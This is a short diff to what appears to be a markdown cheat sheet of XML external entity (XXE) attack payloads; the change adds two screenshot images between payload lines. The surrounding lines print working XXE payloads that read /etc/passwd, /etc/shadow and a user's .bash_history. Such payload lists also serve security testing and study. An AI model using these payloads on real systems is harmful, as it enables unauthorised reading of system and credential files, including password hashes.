@@ -144,7 +144,11 @@ The vulnerability generally requires:
 ## 4. Parameters & File Access XXE Payloads
 ```html
 <!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd">%remote;]>
+<img width="1064" height="338" alt="image" src="https://github.com/user-attachments/assets/0e4770da-8403-40ac-81d5-f624082704fb" />
 <!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///home/srvadmin/.bash_history">%remote;]>
+<img width="1302" height="168" alt="image" src="https://github.com/user-attachments/assets/cdc4060b-fdca-42f3-aaab-eaef5247786e" />
+
+
 
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]><foo>&xxe;</foo>
